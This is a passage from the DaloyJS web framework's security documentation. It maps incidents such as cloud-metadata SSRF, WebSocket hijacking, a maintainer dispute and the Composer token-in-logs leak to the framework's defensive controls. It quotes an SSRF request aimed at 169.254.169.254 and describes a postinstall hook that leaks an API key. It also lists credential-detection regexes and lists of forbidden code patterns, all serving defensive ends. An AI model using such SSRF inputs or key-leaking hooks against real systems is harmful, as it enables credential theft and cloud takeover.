| Outbound SSRF from a handler to a provider endpoint chosen by the attacker (`POST /chat { provider_url: "http://169.254.169.254/..." }`) | Wrap user-controlled outbound `fetch` calls with `fetchGuard()` from [`src/fetch-guard.ts`](src/fetch-guard.ts). The guard blocks loopback (`127.0.0.0/8`, `::1`), RFC1918 private ranges, link-local (`169.254.0.0/16`, `fe80::/10` — every documented cloud metadata IP for AWS/Azure/DigitalOcean), IPv6 unique-local (`fc00::/7`), plus an always-deny floor covering CGNAT (`100.64.0.0/10` — Alibaba `100.100.100.200`), `192.0.0.0/24` (Oracle Cloud `192.0.0.192`), all IANA-reserved / multicast / broadcast ranges, and rejects non-`http`/`https` protocols (`file:`, `data:`, `gopher:`, `ftp:`). Redirects are followed manually with re-validation at every hop — a `302 -> http://169.254.169.254/` cannot bypass the check. IPv4-mapped IPv6 (`::ffff:a.b.c.d`) is recursively checked against the embedded IPv4 address. Closes the Aikido [“simple email form” cloud-takeover SSRF chain](https://www.aikido.dev/blog/how-a-startups-cloud-got-taken-over-by-a-simple-form-that-sends-an-email). |
| Cross-Site WebSocket Hijacking on a streaming-chat WebSocket route (`wss://app/chat`) that already has the user's session cookie | `app.ws()` refuses-at-registration in production unless the route sets `allowedOrigins` (`"same-origin"`, a string allowlist, or a predicate) or explicitly opts in via `acknowledgeCrossOriginUpgrade: true`. Closes the [Storybook CVE-2026-27148](https://www.aikido.dev/blog/storybooks-websockets-attack) class of bug for AI chat sockets that often carry both a session cookie *and* the user's provider key. |
| Maintainer of the consumer app published their AI app's npm package with a `postinstall` that leaks `process.env.OPENAI_API_KEY` from CI | Scaffolded `create-daloy` templates ship `ignore-scripts=true` and an empty `pnpm.onlyBuiltDependencies` allowlist; the template `_gitignore` excludes `.env*` so a provider key in `.env.local` cannot be committed by accident; `step-security/harden-runner` on our own publish workflow is the model we recommend consumers copy. |

**What this does not defend against, and we say so explicitly:**

- An app that builds its own AI gateway *inside* a Daloy handler and writes
  user-controlled SQL via string concatenation. Daloy cannot stop a route
  that hands an attacker arbitrary SQL — that is the LiteLLM CVE-2026-42208
  shape and it is out of scope as "Insecure handler code" (see § Explicitly
  out of scope). The framework narrows the input surface; the handler must
  still use parameterized queries.
- An app that logs the **request body** of a chat completion call. If the
  user prompt is `"my OpenAI key is sk-..."`, no header-name allowlist can
  redact it. The `redactJwtLikeStrings` heuristic catches JWT-shaped tokens
  but not provider keys, which have provider-specific prefixes
  (`sk-`, `sk-ant-`, `AIza...`). Consumers logging request bodies should
  scrub the body server-side before the call to `logger.info`.
- An app that stores provider keys in the database in plaintext. Daloy
  does not ship a secrets manager; the recommended posture is to put
  provider keys in the runtime's secret store (Vault, Doppler, AWS Secrets
  Manager, Cloudflare Workers Secrets, Vercel Encrypted Env), not in
  application database rows.
- A handler that builds an outbound `fetch(req.body.provider_url, …)`
  without wrapping it through `fetchGuard()`. The guard is opt-in (Daloy
  cannot rewrite `globalThis.fetch` safely for every runtime), so a
  handler that imports the raw `fetch` and skips the wrapper is on its
  own — the runtime's network policy is then the only line of defense.
- A LiteLLM (or any other AI gateway) instance running **alongside** a Daloy
  app. The Daloy app's controls apply to the Daloy process, not to a
  sibling Python service on the same network. If you run LiteLLM in
  production, patch promptly and follow Snyk's blast-radius guidance.

If a future AI-gateway incident report describes an attack step that any
control in the table above should have blocked, treat the gap as a
release-blocking bug and open a private advisory.

If you suspect a compromised version of `@daloyjs/core` or `create-daloy`:

- Compare the published tarball's provenance attestation against the source
  commit at <https://www.npmjs.com/package/@daloyjs/core>.
- Look in the published manifest for unexpected `optionalDependencies`,
  `peerDependencies`, or `bin` entries — especially anything pointing to a
  fork (e.g. `github:owner/repo#<sha>`).
- Look in the unpacked tarball for files outside of `dist/` and `README.md`
  (the only paths in our `files` field).
- Report to <https://github.com/daloyjs/daloy/security/advisories/new>.

### Maintainer-access dispute in a low-level dependency (fsnotify 2026-05-08 pattern)

Socket's 2026-05-08 writeup of the
[fsnotify maintainer dispute](https://socket.dev/blog/fsnotify-maintainer-dispute-sparks-supply-chain-concerns)
documents an *attack-shaped* event that turned out **not** to be an attack:
a popular low-level dependency (Go's cross-platform filesystem-watcher,
~321k dependent projects) saw a sudden removal of contributors from the
GitHub organization, a deleted public post by a removed maintainer, and
two fresh releases (`v1.10.0` and `v1.10.1`) shipped during the resulting
confusion. There was no evidence any of those releases were compromised.
The supply-chain concern, in Socket's words, is that "the early stages of
a real supply chain compromise and the early stages of a maintainer
dispute can look similar from the outside" — unclear release authority in
a critical low-level dependency sends downstream users into verification
mode even when nothing malicious happened.

`fsnotify` itself is a Go library and is **not** in `@daloyjs/core`'s
dependency tree (or any scaffolded template's tree) — Daloy is
Node/TypeScript and does not ship a filesystem-watcher. But the *shape* of
the incident — "popular low-level dep + sudden access changes +
back-to-back releases during a dispute" — can land on the npm side
tomorrow (`chokidar`, `node-watch`, `picomatch`, `signal-exit`, or any
other deep transitive watcher / utility). We map our controls explicitly so
operators don't have to re-derive them when the next npm version of this
story breaks.

| Attack-shaped step | DaloyJS / template control |
| --- | --- |
| Popular low-level dependency ships a back-to-back release while maintainer authority is in dispute, and downstream consumers `pnpm install` it inside the dispute window | `minimum-release-age=1440` (24 h cooldown) in this repo's [`.npmrc`](.npmrc) **and** in every scaffolded template's `_npmrc` ([`packages/create-daloy/templates/node-basic/_npmrc`](packages/create-daloy/templates/node-basic/_npmrc), `bun-basic`, `cloudflare-worker`, `vercel-edge`, etc.) refuses to resolve any version published less than 24 hours ago. If the disputed release turns out to be the start of a real takeover and is yanked inside that window (the typical detect-and-unpublish cadence), no consumer install ever resolves to it. |
| Disputed dependency lives deep in the transitive tree, so downstream maintainers don't know they depend on it until a CVE drops | `@daloyjs/core` declares **zero runtime dependencies** ([`scripts/verify-no-runtime-deps.ts`](scripts/verify-no-runtime-deps.ts) runs as `pnpm verify:no-runtime-deps` in CI and in the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml)). Installing `@daloyjs/core` cannot pull a filesystem-watcher (or any other transitive dep) into a consumer's tree. `zod` is the only declared peer. The transitive surface a consumer has to worry about during a low-level-dep dispute is entirely the consumer's own — not Daloy's. |
| New maintainer (or attacker) publishes a release whose tarball points at a `git+`, `github:`, or non-`registry.npmjs.org` source so registry scanners can't see the contents | `blockExoticSubdeps: true` in [`pnpm-workspace.yaml`](pnpm-workspace.yaml) and every template's `pnpm-workspace.yaml` refuses to install exotic sub-deps. `pnpm verify:lockfile` ([`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts)) runs in [`ci.yml`](.github/workflows/ci.yml) and the pre-publish `verify` job in `release.yml` and rejects any tarball whose origin is not `registry.npmjs.org`. |
| Consumer's CI silently picks up the disputed release through a caret range during a routine rebuild | [`pnpm-lock.yaml`](pnpm-lock.yaml) is committed; CI runs `pnpm install --frozen-lockfile`; `pnpm verify:lockfile` rejects substitution. A rebuild resolves to the exact version recorded in the lockfile, not whatever the disputed dep's `latest` tag points at this hour. The same posture is shipped in every scaffolded template. |
| Disputed release ships a `postinstall` / `preinstall` / `prepare` hook that fires the moment a consumer installs it | `ignore-scripts=true` in this repo's [`.npmrc`](.npmrc) and every template's `_npmrc` suppresses every lifecycle script. Packages permitted to build are listed explicitly in `pnpm.onlyBuiltDependencies` and `pnpm-workspace.yaml#onlyBuiltDependencies` (currently only `esbuild` in the framework; templates ship an empty allowlist). pnpm 11's `strictDepBuilds: true` (framework only) hard-refuses any newly added dep that *needs* to build. |
| Disputed release lands code that fires at **import time** (the `node-ipc` / Lightning shape) rather than at `postinstall` | Same belt-and-braces as the `node-ipc 2026-05-14` and Lightning rows above: `@daloyjs/core` has zero runtime deps so it cannot transitively load a disputed package at import time; [`src/index.ts`](src/index.ts) is pure re-exports with no top-level side-effecting code (no `fetch`, no `spawn`, no `Buffer.from(..., "base64")` blobs, no `eval`); `scripts/verify-no-remote-exec.ts` refuses any `src/**` file that imports `node:child_process` / `node:vm`, calls bare `eval`, constructs `new Function` from a string, or dynamically imports a remote URL. |
| Operator wants to verify the published bytes against the source commit before re-pinning | Every `@daloyjs/core` and `create-daloy` tarball is published with `--provenance` (root [`.npmrc`](.npmrc) sets `provenance=true`), which binds the bytes to the source commit and the `release.yml` workflow run via npm trusted publishing (OIDC) and Sigstore. The provenance attestation is the same primitive an operator should look for on a disputed third-party package before re-pinning to a fresh release. |

**The reverse case — could a `fsnotify`-shaped maintainer dispute happen
inside the Daloy project itself, and what stops it from translating into
a malicious release?** We list the controls explicitly so the answer is
not "trust us".

| Concern raised by the fsnotify story | DaloyJS governance control |
| --- | --- |
| One maintainer silently removes other maintainers from the GitHub organization and starts cutting releases unilaterally | The **Active** rotation lives in [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) (cryptographically inspectable from git history; CODEOWNERS-protected by [`.github/CODEOWNERS`](.github/CODEOWNERS)) and is verified each quarter by the disclosure exercise (§ Recurring security-disclosure exercise). Off-boarding is a documented step on the release checklist (§ Maintainer accounts), not an ad-hoc decision. `pnpm verify:governance-audits` refuses any PR that removes `SECURITY-CONTACTS.md` or `.github/CODEOWNERS`. |
| Disputed maintainer pushes a fresh release directly to `main` and tags it | Branch protection on `main` requires PR review; CODEOWNERS enforces it for `package.json`, `pnpm-lock.yaml`, `.npmrc`, and `.github/`. Every release commit and `v*` tag is **signed**. The publish job in [`release.yml`](.github/workflows/release.yml) only runs from a signed `v*` tag and only inside the protected `npm-publish` GitHub Environment, which **requires a second listed maintainer to approve** before any `pnpm publish` runs. A single-maintainer push-then-tag does not produce a release on its own. |
| Pre-publish `verify` job is silently weakened during the dispute (drop a `verify:*` gate, unpin an action, remove `harden-runner`) | `pnpm verify:governance-audits` ([`scripts/verify-governance-audits.ts`](scripts/verify-governance-audits.ts)) refuses any PR that removes the top-level `permissions:` block, `persist-credentials: false`, a SHA-pin on a third-party action, `step-security/harden-runner` on workflows that use third-party actions, or the zero-runtime-deps gate. `zizmor` ([`.github/workflows/zizmor.yml`](.github/workflows/zizmor.yml)) statically rejects unsafe workflow patterns. Both gates run in `ci.yml` and the pre-publish `verify` job in `release.yml`, so a PR cannot pass CI under one rule set and be published under a weaker one. |
| Publish actor is not who the maintainer rotation says it should be | The pre-publish `verify` job refuses to publish unless the GitHub actor on the publish run is listed in the **Active** block of [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) (§ Release checklist, step 6 — release gate). A removed maintainer who somehow re-claimed npm publish rights but is no longer in the active block cannot land a release. |
| Outside observers cannot tell who actually controls the release pipeline | Release authority is documented in three places that move together: [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md), [`.github/CODEOWNERS`](.github/CODEOWNERS), and the signed-tag chain in `git log`. The `npm-publish` GitHub Environment's required reviewers are the GitHub-side mirror of the same list. [`PROJECT_HISTORY.md`](PROJECT_HISTORY.md) records every release in append-only fashion (we have never force-pushed `main` and have never deleted a published version from npm — see § Mapping to Aikido Package Health → Maturity). |
| A removed maintainer's GitHub or npm recovery email lapses and is re-registered by an attacker | The quarterly disclosure exercise (§ Recurring security-disclosure exercise, item 5, added 2026-05-20 in response to the `node-ipc` 2026-05-14 reload) verifies that every active contact's recovery-email domain still resolves to a domain the contact owns or to a custodial provider where the contact still has an active account. A lapsed-domain finding blocks the next publish. |

**What this does not defend against, and we say so explicitly:**

- A consumer who depends on a *different* low-level npm package that hits
  a fsnotify-shaped governance dispute. Daloy can only speak to
  `@daloyjs/core` and `create-daloy`. For every other package in the
  consumer's tree the consumer should re-pin off a known-good lockfile,
  wait out the 24 h cooldown, and verify the provenance attestation
  before adopting a new release from the disputed project.
- A genuine, well-intentioned fork. If a low-level dep does end up
  forking under a new name (the article notes
  `gofsnotify/fsnotify` as the announced fork from one removed
  maintainer), evaluating that fork is the consumer's call. The most
  Daloy can do is keep the *original* tree honest: zero runtime deps in
  `@daloyjs/core` means the framework cannot drag a consumer into either
  side of a fork by accident.
- Two compromised Daloy maintainers acting together. The CODEOWNERS,
  branch-protection, and `npm-publish` Environment controls assume the
  required approver is independent of the proposer; two simultaneously
  compromised accounts defeat that assumption. Hardware-backed 2FA on
  every active maintainer and the off-boarding checklist exist to make
  that expensive — and the quarterly disclosure exercise is the
  recurring drill that catches drift before two accounts can drift
  together.

If a future incident report describes a maintainer-dispute-shaped attack
step that any control in either table above should have blocked, treat
the gap as a release-blocking bug and open a private advisory.

### Token-value leaked into a log line (Composer / Packagist 2026-05-13 pattern)

Socket's 2026-05-13 writeup of the
[Composer / Packagist token disclosure](https://socket.dev/blog/packagist-urges-immediate-composer-update)
documents an incident where Composer 2.x printed the **full contents of
a GitHub Actions–issued `GITHUB_TOKEN` or GitHub App installation token
into stderr** when the token failed a hardcoded format validator.
GitHub's rollout of the new variable-length `ghs_APPID_JWT` token shape
on 2026-04-27 made tokens that Composer's regex did not recognize, so
the rejection path's "got token: X" error message leaked the credential
into CI logs. GitHub-hosted runner tokens usually expire at job end (or
6 h max), but self-hosted runner tokens can stay valid for 24 h after
issuance, and GitHub App tokens can have broader scopes.

The two transferable lessons for any framework — not just Composer:

1. **Never embed a credential value in an error message.** Even a
   passing reference like `"unable to authenticate, got token: $token"`
   is a one-line credential leak the moment that branch fires.
2. **Never validate a credential against a hardcoded format
   assumption.** Treat tokens as opaque. GitHub's own guidance after
   this rollout: "avoid hardcoded token patterns entirely."

Daloy is a Node/TypeScript web framework, not a package manager, but it
brokers credentials in three of the same shapes Composer leaked
(Bearer tokens for `bearerAuth()` / `jwk()` / `jwt()`, session cookies,
and outbound provider keys via `fetchGuard()`/AI gateway patterns). We
map our controls explicitly so the same line never leaves a Daloy
process.

| Attack-shaped step | DaloyJS control |
| --- | --- |
| Framework code embeds the rejected token value into the thrown error / log line, exactly as Composer did | Every credential-rejection path in [`src/jwt.ts`](src/jwt.ts), [`src/jwk.ts`](src/jwk.ts), [`src/middleware.ts`](src/middleware.ts) (`bearerAuth()`, CSRF), and [`src/time-claims.ts`](src/time-claims.ts) throws a generic `JwtError` / `ForbiddenError` / `BadRequestError` with a fixed message (`"invalid_token"`, `"Invalid token"`, `"Token revoked"`, `"CSRF token missing or invalid"`, `"token has expired (exp)."`, `"jwt(): token must have three dot-separated segments."`). The rejected value is **never interpolated** into the message. The RFC 6750 `WWW-Authenticate: Bearer error="invalid_token"` response carries no token text either. |
| User code or an upstream library logs an object that happens to carry a Bearer/Cookie/API-key header | Key-based redaction in [`src/logger.ts`](src/logger.ts) (`DEFAULT_REDACT_KEYS`) already masks `authorization`, `cookie`, `set-cookie`, `token`, `access_token`, `refresh_token`, `id_token`, `password`, `client_secret`, `x-api-key`, and the LiteLLM-class provider headers (`openai-api-key`, `anthropic-api-key`, `x-goog-api-key`, `x-litellm-master-key`, etc.) at every depth, case-insensitively. |
| User code logs a string containing a JWT — even under a non-redacted field name | `redactJwtLikeStrings: true` (default) replaces any string value matching `^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$` with the censor. |
| **The exact Composer leak shape**: user code interpolates a rejected token into a message (`"got token: ghs_… from CI"`) under an unrecognized field name, or assigns the raw value to a custom field | `redactCredentialLikeStrings: true` (default, added in `@daloyjs/core` 0.69.0 in response to this incident) walks every string value in the log record and replaces substrings matching the published shapes of the most common opaque provider credentials: GitHub `gh[opsur]_…` / `github_pat_…`, Slack `xox[abprs]-…`, AWS `AKIA…`/`ASIA…`, Stripe `sk_live_…`/`sk_test_…`/`rk_…`/`pk_live_…`, npm `npm_…`, GitLab `glpat-…`, Google `AIza…`, Anthropic `sk-ant-…`, OpenAI `sk-…`. Lengths are anchored conservatively so ordinary identifiers (`uuid`s, `sk-abc` test fixtures, short prefixes) are left alone — see the false-positive regression test in [`tests/logger-redaction-and-header-smuggling.test.ts`](tests/logger-redaction-and-header-smuggling.test.ts). Combined with key-based and JWT-shape redaction, an accidental `logger.error({ err: …token… })` cannot leak the credential. |
| Framework code parses an incoming bearer token by **shape** before sending it to the verifier, and rejects new token formats it does not recognize (the root cause of the Composer leak) | `bearerAuth()` ([`src/middleware.ts`](src/middleware.ts)) and `jwk()` ([`src/jwk.ts`](src/jwk.ts)) extract the bearer credential with a minimal `^Bearer\s+(.+)$` parser and hand the value verbatim to the user-supplied `validate` / JWKS verifier. There is no hardcoded length, charset, or prefix check against the token contents. New provider token shapes (longer JWTs, App-issued `ghs_APPID_JWT`-style tokens, future opaque formats) flow straight through to the verifier; verification failure throws the same generic `invalid_token` response. |
| Token validation fails *and* the framework includes the offending value in a CI-visible exception (the `1.10.x` / `2.9.x` Composer bug) | Every `JwtError` constructor in [`src/jwt.ts`](src/jwt.ts) (`invalid_token`, `invalid_key`, `weak_hs_secret`, `missing_kid`) takes a fixed-string `reason` + a fixed-string human message; both are reviewed in code review and locked by tests in `tests/jwt*.test.ts`. The same convention is followed by `TemporalClaimError` in [`src/time-claims.ts`](src/time-claims.ts) and the `ForbiddenError`/`BadRequestError` instances thrown by the bearer and CSRF paths. |
| A custom validator written by a Daloy user `throw new Error(\`bad token: ${tok}\`)` and that string lands in the structured log | Defense-in-depth: even if user code does this, the logger's `redactCredentialLikeStrings` pass redacts the matching substring **before** `JSON.stringify` writes the record. The user's mistake degrades to a generic `[REDACTED]` placeholder in the log line, not a credential leak. Documented as the recommended pattern in [`README.md`](README.md) so users see it before writing their first custom verifier. |

**What this does not defend against, and we say so explicitly:**

- A custom logger plugged in via `new App({ logger: myPino })`. Daloy's
  default `createLogger()` does the redaction; a user-supplied logger
  is on the user. `redactRecord()` and `DEFAULT_REDACT_KEYS` are
  exported from [`src/logger.ts`](src/logger.ts) so a custom logger can
  apply the same policy with one extra line in its serializer.
- Stack traces printed by `process.on("uncaughtException", …)` or by a
  panicking transitive dependency. The redaction pass only runs on
  records that go through `createLogger`. An out-of-band `console.error(err)`
  call from outside the framework is the runtime's problem; treat
  `uncaughtException` as a fatal-shutdown signal in production and rely
  on the platform's secrets-masking (GitHub Actions does mask known
  secret env vars in the runner log).
- A credential format the value-shape detector does not yet know about.
  The patterns above are anchored to *published* provider formats as
  of 2026-05. New shapes (or rotated formats like GitHub's 2026-04
  `ghs_APPID_JWT` change) require a one-line addition to
  `CREDENTIAL_LIKE_RE` and a new regression-test fixture; the key-based
  redaction list and the user's own redact-keys override remain the
  primary defense for header-carried credentials.

If a future incident report describes a token-leaked-into-a-log-line
attack step that any control in the table above should have blocked,
treat the gap as a release-blocking bug and open a private advisory.

### JPMorganChase SaaS open letter (Opet 2025 pillars)

On 2025-04-26, JPMorganChase CISO Patrick Opet published
[an open letter to third-party suppliers](https://www.jpmorganchase.com/about/technology/blog/open-letter-to-our-suppliers),
timed to RSA Conference 2025, warning that the SaaS delivery model "is
quietly enabling cyber attackers and — as its adoption grows — is creating
a substantial vulnerability that is weakening the global economic system."
Snyk's [coverage of the letter](https://snyk.io/blog/snyk-covers-jpmorgan-cyber-list/)
distills it into four pillars third-party software providers must address.

DaloyJS is **a framework, not a SaaS product**, but the letter's posture
applies transitively to every app built on it. The table below maps each
of Opet's pillars to existing Daloy controls so consumers, procurement
reviewers, and incident-response teams can answer the letter's questions
without re-reading the rest of this file.

| Opet pillar | What Daloy already ships |
| --- | --- |
| **1. Security must be prioritized — built in or enabled by default, not gated behind a premium tier.** | Twelve **secure-by-default waves** (see [`otherdocs/secure-by-default-plan.md`](otherdocs/secure-by-default-plan.md) and the `PROJECT_HISTORY` `0.15.0` → `0.33.0` band) shipped in the open-source `@daloyjs/core` package with no paid tier. Every control listed in § "In scope (the framework MUST defend)" above is on by default in `NODE_ENV=production`. The framework **refuses to boot** on known-bad configs: weak session secrets (< 32 UTF-8 bytes, known-weak strings) in [`src/security.ts`](src/security.ts) via `assertStrongSecret()`; `cors({ origin: "*" })` paired with credentialed routes; `session()` + a state-changing route without `csrf()`; `X-Forwarded-*` headers without an explicit proxy trust opt-in; `app.healthcheck()` / `app.readinesscheck()` exposed in production without `acknowledgeUnauthenticated: true`. Opt-out exists (`app({ secureDefaults: false })`) and requires an explicit, auditable decision in the consumer app. There is no "enterprise edition" toggle for any of these. |
| **2. Security architecture must be modernized — no "single-factor explicit trust" via OAuth tokens that collapse authentication into authorization.** | First-party `createJwtSigner()` / `createJwtVerifier()` in [`src/jwt.ts`](src/jwt.ts) refuse `alg: "none"` at both signer and verifier construction, **require** an explicit `algorithms` allowlist at the verifier (no implicit "any RS256"), refuse HS+JWK / HS+resolver combinations (closing the classic JWKS confused-deputy attack), require `maxLifetimeSeconds` at the signer (no implicit "forever"), require `exp`, and refuse `exp - iat > maxLifetimeSeconds`. `jwk()` provides first-party JWKS resolution with refresh + cache controls. `bearerAuth`, `basicAuth`, and signed-cookie `session` are separate primitives so authentication (who) and authorization (allowed) never collapse into one token: the route's authorization policy is the developer's explicit decision in the handler or in a per-route hook, not implicit from "the token verified". The CSWSH guard on `app.ws()` runs the Origin check **before** any cookie-bearing `beforeUpgrade` hook, refusing the drive-by hijack class even when a valid session cookie is present. `secureHeaders()` ships CSP nonce + Trusted Types so a stored-XSS pivot cannot silently swap a victim's OAuth flow into an attacker's. |
| **3. Inadequately secured authentication tokens, opaque privileged third-party access, and "fourth-party" vendor dependencies silently expanding the risk surface.** | **Token theft / reuse**: log redaction (`src/logger.ts`) covers `authorization`, `cookie`, `set-cookie`, `x-api-key`, `api-key`, `apikey`, `password`, `passwd`, `secret`, `token`, `access_token`, `refresh_token`, `id_token`, `client_secret`, every common LLM-provider key header, JWT-shaped strings, and (case-insensitive) at every depth of the log record. `timingSafeEqual()` plus `pnpm verify:secret-comparisons` reject any new `===` / `!==` against a secret-shaped variable in `src/`. Stripped `Server` / `X-Powered-By` headers; duplicate `Host` / `Content-Length` rejection. **Opaque fourth-party deps**: `@daloyjs/core` has **zero runtime dependencies** ([`scripts/verify-no-runtime-deps.ts`](scripts/verify-no-runtime-deps.ts) gates every release); `zod` is the only peer. The hardened [`.npmrc`](.npmrc) enforces `minimum-release-age=1440`, `ignore-scripts=true`, `verify-store-integrity=true`, `prefer-frozen-lockfile=true`, `provenance=true`. `blockExoticSubdeps: true` in [`pnpm-workspace.yaml`](pnpm-workspace.yaml) plus `pnpm verify:lockfile` reject git/ssh/http tarball sources. **Privileged third-party access**: every scaffolded template inherits the same `_npmrc` + `pnpm-workspace.yaml` discipline so a downstream app cannot accidentally widen the supply-chain trust boundary just by adding a dep. |
| **4. Continuous, demonstrable evidence of controls — not annual compliance checks — plus customer-side options like confidential computing, self-hosting, and BYOC.** | **Continuous evidence**: [OpenSSF Scorecard](https://securityscorecards.dev/viewer/?uri=github.com/daloyjs/daloy) and CodeQL run on every push; [`zizmor`](.github/workflows/zizmor.yml) statically analyses every workflow on every PR; `pnpm typecheck` + `pnpm test` + `pnpm coverage` (≥90% line/function, ≥90% branch) + `pnpm verify:no-runtime-deps` + `pnpm verify:no-lifecycle-scripts` + `pnpm verify:no-bin-shadowing` + `pnpm verify:lockfile` + `pnpm verify:secret-comparisons` + `pnpm verify:parity-audits` … `pnpm verify:routing-hardening-audits` all run in CI and on every release tag. Every published tarball carries an npm provenance attestation bound to its source commit and workflow run via Sigstore. `step-security/harden-runner` monitors and blocks egress on the publish workflow. **Customer self-hosting**: the framework's only contract with the runtime is `Request → Response`, so the same app runs on Node, Bun, Deno, Cloudflare Workers, and Vercel Edge — the consumer chooses **where** their data is processed, including fully on-prem or in a private VPC. There is no Daloy-operated SaaS control plane, no telemetry call-home, and no required cloud account; the [`AGENTS.md`](AGENTS.md) "Quality Gates" and `pnpm coverage` thresholds are the only continuous-evidence loop, and they run inside the consumer's CI. BYOC and confidential-compute deployments work because the framework never assumes egress to a vendor-owned service is available. |

**What this section does NOT claim:**

- That the framework can make a *consumer's* OAuth flow correct. OAuth-flow
  correctness, refresh-token rotation discipline, scope minimization, and
  consent-screen review remain the consumer app's responsibility (see
  § Explicitly out of scope — "Credential storage and rotation"). Daloy
  ships safe primitives (`bearerAuth`, signed-cookie `session`, JWT helpers
  with strict `alg` discipline); the policy is still on the developer.
- That zero-runtime-deps eliminates fourth-party risk for the *whole app*.
  A consumer that pulls in a 400-dep ORM, an SDK with `postinstall` hooks
  disabled by `ignore-scripts=true` only at the framework level, or a
  vendor whose own supply chain is opaque inherits that risk on top of
  Daloy's. The scaffolded `create-daloy` templates ship the same
  hardened `_npmrc` so a green-field app starts from the same posture,
  but the consumer's dep choices still matter.
- That a runtime-portable framework eliminates concentration risk
  industry-wide. The letter's macroeconomic point about "a small set of
  leading service providers, embedding concentration risk into global
  critical infrastructure" is about the SaaS market shape; a framework can
  only ensure that **its own** consumers are not forced into one
  provider. Daloy does this by treating every adapter as equally
  supported, with no preferred "Daloy Cloud" — but the broader market
  shape is not something a library can fix on its own.

If a future incident report describes an attack step that any control in
this section should have blocked, treat the gap as a release-blocking bug
and open a private advisory via
<https://github.com/daloyjs/daloy/security/advisories/new>.

### Snyk "Jedi lessons to level up your JavaScript security" mapping

Snyk's [3 Jedi-inspired lessons to level up your JavaScript security](https://snyk.io/blog/jedi-lessons-to-level-up-javascript-security/)
post (Liran Tal, 2022) is generic JS-security guidance rather than a single
CVE, but operators occasionally cite it when asking which of its concrete
recommendations a framework should already enforce on their behalf. Each
concrete tool / class the post calls out maps to an existing DaloyJS
control, so adopting Daloy gives a downstream project these defenses by
default without any extra `npm install` / `pre-commit` plumbing:

| Snyk recommendation | DaloyJS / template control |
| --- | --- |
| Detect **Trojan Source** / invisible-Unicode attacks ([`eslint-plugin-anti-trojan-source`](https://github.com/lirantal/eslint-plugin-anti-trojan-source)) | [`pnpm verify:no-invisible-unicode`](scripts/verify-no-invisible-unicode.ts) runs in [`ci.yml`](.github/workflows/ci.yml) and the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml). It rejects every bidi-control / zero-width / format / tag / variation-selector codepoint in `src/`, `bin/`, `scripts/`, `tests/`, and the assembled tarball. Closes the trojan-source class without requiring consumers to wire up an ESLint plugin. |
| Lint `pnpm-lock.yaml` / `package-lock.json` against malicious-module injection (`lockfile-lint`) | [`pnpm verify:lockfile`](scripts/verify-lockfile-sources.ts) refuses any lockfile entry resolved from a non-registry source (`git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…`, or any tarball URL outside `registry.npmjs.org`). The root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` pin `registry=https://registry.npmjs.org/`, and `pnpm install --frozen-lockfile` runs in CI. Lockfile drift is a PR-review event, not a silent install. |
| Prevent **dependency confusion** (attacker registers an unclaimed internal name on the public registry) | All Daloy-published names are scoped under `@daloyjs/*` or the registered unscoped name `create-daloy`; the scope is owned at the registry level so an attacker cannot publish `@daloyjs/anything-else`. The `verify:lockfile` gate above plus `blockExoticSubdeps: true` in [`pnpm-workspace.yaml`](pnpm-workspace.yaml) (and the template equivalents) refuse transitive deps from any source other than the configured registry. See § Supply-chain security → "Dependency confusion" for the full row. |
| Avoid **typosquatting** + deprecated / unhealthy packages | `@daloyjs/core` declares **zero runtime dependencies** (enforced by [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts)), so consumers carry no transitive `npm install` surface a typo can land on through us. [`pnpm verify:no-bin-shadowing`](scripts/verify-no-bin-shadowing.ts) closes the bin-script typosquat class flagged by [Socket](https://socket.dev/blog/npm-bin-script-confusion). `minimum-release-age=1440` in root [`.npmrc`](.npmrc) and every template `_npmrc` adds a 24 h cooldown so a freshly-published typosquat cannot resolve before analysis catches it. See also § Supply-chain security → "Typosquatting" and the four typosquat-pattern sub-sections above (shopsprint, IR.* NuGet, axios, bin-script confusion). |
| Run continuous vulnerability scanning (`snyk test` / IDE plugin / repo monitor) | The framework's own pipeline runs `pnpm audit --audit-level=high` in [`ci.yml`](.github/workflows/ci.yml) and again in the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml), alongside the full [`verify:*`](scripts) family. Scaffolded `create-daloy` templates ship the same audit step in their generated [`packages/create-daloy/templates/_ci/node/SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) workflow, plus Dependabot configuration, so a green-field app starts with continuous scanning enabled. Consumers can layer Snyk / Socket / Aikido on top, but the baseline does not require it. |
| Defend against **prototype pollution** | Core `safeJsonParse` strips `__proto__` / `constructor` / `prototype` via reviver on every parsed JSON request body; the three non-JSON parsers in [`src/app.ts`](src/app.ts) funnel keys through `isForbiddenObjectKey` from [`src/security.ts`](src/security.ts) and drop the same keys before assignment; JWT verification ([`src/jwt.ts`](src/jwt.ts)) applies the reviver to the attacker-controlled header and payload. See § Threat model → "Prototype pollution via JSON" and "Parameter-binding RCE (Spring4Shell-class)" for the full rows. Regression-tested in [`tests/security.test.ts`](tests/security.test.ts). |

What this section **does not** claim:

- That the framework relieves consumers from secure-code-review discipline
  in their own handlers. The post's "your eyes can deceive you" advice
  about reviewing for security-relevant patterns still applies to
  application code; Daloy can only enforce the framework boundary.
- That `@daloyjs/core` replaces a vulnerability scanner. We ship audit
  gates and zero runtime deps; consumers should still run a SCA tool of
  their choice (Snyk, Socket, Aikido, GitHub Dependabot) against their
  own dep tree.
- That any of the above blocks a human author from typing a typosquatted
  name into their own `package.json`. Mitigations are review, scope
  awareness (`@daloyjs/*`), and `pnpm why <name>` before merge.

If a future incident report describes an attack step that any control in
this section should have blocked, treat the gap as a release-blocking bug
and open a private advisory via
<https://github.com/daloyjs/daloy/security/advisories/new>.
